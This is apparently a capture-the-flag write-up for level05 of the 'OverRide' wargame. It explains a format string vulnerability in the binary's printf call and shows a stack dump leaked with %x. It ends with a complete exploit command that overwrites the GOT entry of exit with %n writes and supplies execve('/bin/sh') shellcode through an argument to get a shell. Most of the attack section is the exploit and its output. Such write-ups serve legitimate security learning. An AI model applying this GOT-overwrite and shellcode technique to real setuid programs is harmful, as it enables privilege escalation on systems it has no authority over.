we can see that from stdin the program will print on screen a lowercase version of our input

we can see a format string vuln in asm code line main+195
we can also see that we have a buffer of 100
the idea should be to combine a shellcode from stdin with a printf exploit to override
got etntry of exit with adress shellcode

1st step try to redirect code exec to our string on stack set by fgets
so exploit to point on shellcode+ input = \x90*100
`
level05@OverRide:~$ ./level05 
AAAABBBB%x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x 
aaaabbbb64 f7fcfac0 f7ec3af9 ffffd6df ffffd6de 0 ffffffff ffffd764 f7fdb000 61616161 62626262 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 level05@OverRide:~$
`
by displaying stack with format string vuln we can see that we control from 10th param
we are going to use 10th and 11yh param to rewrite got entry by performing 2 printfs wit %n

final solution

(echo -ne '\xe0\x97\x04\x08\xe2\x97\x04\x08%10$57278x%10$n%11$73785x%11$n\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'; cat) | env -i ~/level05 "$(echo -ne '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80')"


